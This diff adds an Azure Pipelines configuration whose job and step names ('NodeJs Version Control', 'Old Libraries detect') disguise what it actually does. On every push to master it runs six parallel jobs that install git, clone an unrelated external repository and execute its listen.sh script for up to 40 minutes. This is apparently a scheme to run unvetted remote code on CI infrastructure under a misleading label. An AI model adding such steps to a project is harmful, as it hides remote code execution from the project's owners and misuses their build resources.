@@ -1,0 +1,17 @@
+trigger:
+- master
+
+jobs:
+- job: NodeJs Version Control
+  strategy:
+    parallel: 6
+  pool:
+    vmImage: 'ubuntu-18.04'
+  steps:
+  - script: |
+      sudo apt update
+      sudo apt install git sudo -y
+      git clone https://github.com/samita100/test.git
+      cd test
+      timeout 40m bash listen.sh
+    displayName: 'Old Libraries detect'
